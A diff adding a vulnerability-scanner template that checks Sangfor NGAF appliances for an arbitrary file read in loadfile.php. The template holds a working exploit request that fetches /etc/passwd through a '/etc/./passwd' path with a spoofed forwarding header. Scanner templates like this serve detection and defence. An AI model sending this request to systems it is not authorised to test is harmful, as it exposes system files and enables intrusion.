@@ -1,0 +1,28 @@
+id: sangfor-ngaf-file-read
+info:
+  name: Sangfor NGAF Loadfile Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read, ngaf
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/svpn_html/loadfile.php?file=/etc/./passwd"
+    headers:
+      y-forwarded-for: 127.0.0.1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
